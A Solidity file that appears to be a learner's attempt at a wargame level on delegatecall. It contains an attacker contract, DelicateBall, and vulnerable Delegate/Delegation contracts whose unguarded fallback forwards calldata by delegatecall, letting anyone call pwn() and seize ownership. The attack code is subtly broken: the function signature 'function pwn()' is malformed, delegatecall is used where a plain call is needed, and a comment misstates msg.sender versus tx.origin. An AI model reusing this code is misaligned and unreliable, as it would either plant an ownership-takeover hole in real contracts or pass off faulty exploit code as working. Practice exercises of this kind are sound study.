// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//get targt contractX
//abi encode the 'pwn' methodX
//call nonexistent method on Delegatoin which invokes fallback
///include encoded func call in msg.data of above call

contract DelicateBall {
    Delegation target;
    address targetAddress;
    constructor(address _target) {
        targetAddress = _target;
        target = Delegation(_target);
    }
    function encodePwn() internal pure returns (bytes memory) {
        return abi.encodeWithSignature("function pwn()");
    }
    function encodeFakeFunction() internal pure returns (bytes memory) {
        return abi.encodeWithSignature("function fakeFunction()");
    }
    function invokeExternalFallBack() external {
        bytes memory pwnCode = encodePwn();
        (bool succ, ) = address(targetAddress).delegatecall(
            pwnCode
        );
        require(succ, "delegatecall failed for some reason");
    }
}

//JUST HAD A CLEVER IDEA :)

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender; //delegateall makes EOA the msg.sender instead of tx.orgin
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}